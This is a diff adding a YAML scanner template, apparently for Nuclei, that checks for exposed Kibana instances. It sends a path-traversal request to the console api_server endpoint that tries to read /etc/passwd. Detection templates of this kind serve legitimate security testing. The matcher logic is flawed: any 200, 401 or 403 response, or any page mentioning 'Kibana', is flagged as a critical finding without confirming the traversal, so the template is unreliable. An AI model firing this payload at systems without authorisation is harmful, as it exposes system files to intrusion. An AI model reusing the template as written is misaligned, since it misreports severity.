@@ -1,0 +1,44 @@
+id: kibana-misconfig
+info:
+  name: Kibana Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Kibana instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to system file exposure.
+  tags: kibana, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app/kibana"
+      - "{{BaseURL}}/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}:5601/app/kibana"
+      - "{{BaseURL}}:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Kibana"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Kibana"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
